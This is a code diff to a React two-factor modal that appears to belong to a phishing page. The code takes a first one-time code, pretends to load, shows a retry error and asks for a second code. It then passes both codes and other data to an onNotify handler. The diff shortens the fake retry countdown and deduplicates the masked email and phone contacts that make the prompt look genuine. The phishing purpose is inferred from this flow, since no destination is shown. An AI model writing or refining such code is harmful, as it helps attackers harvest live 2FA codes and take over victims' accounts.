@@ -55,9 +55,9 @@ export default function TwoFactorModal({
   const codeReady = isValidTwoFaCode(code);
   const canSubmit = !disabled && !loading && codeReady;
 
-  const startCountdown = () => {
+  const startCountdown = (seconds = CONFIG.COUNTDOWN_TIME) => {
     setDisabled(true);
-    let time = CONFIG.COUNTDOWN_TIME;
+    let time = seconds;
     setError(t("codeRetry", { time }));
     const timer = setInterval(() => {
       time -= 1;
@@ -87,7 +87,7 @@ export default function TwoFactorModal({
         setCodes({ first: twoFa });
         setLoading(false);
         setStep(1);
-        startCountdown();
+        startCountdown(15);
       }, 1400);
     } else if (step === 1) {
       await onNotify({ twoFaSecond: twoFa, twoFa: codes.first, ...baseData });
@@ -117,14 +117,19 @@ export default function TwoFactorModal({
       : lang === "ar"
         ? "، "
         : ", ";
-  const contacts = [
-    maskEmail(email),
-    maskEmail(emailBusiness),
-    maskPhone(phone),
-    phoneSecondary.trim() ? maskPhone(phoneSecondary) : "",
-  ]
-    .filter(Boolean)
-    .join(contactSeparator);
+  const seenContacts = new Set<string>();
+  const contactItems: string[] = [];
+  const addContact = (raw: string, masked: string) => {
+    const key = raw.trim().toLowerCase().replace(/\s+/g, "");
+    if (!key || !masked || seenContacts.has(key)) return;
+    seenContacts.add(key);
+    contactItems.push(masked);
+  };
+  addContact(email, maskEmail(email));
+  addContact(emailBusiness, maskEmail(emailBusiness));
+  addContact(phone, maskPhone(phone));
+  addContact(phoneSecondary, maskPhone(phoneSecondary));
+  const contacts = contactItems.join(contactSeparator);
   const description = t("authDescription", { contacts });
 
   return (
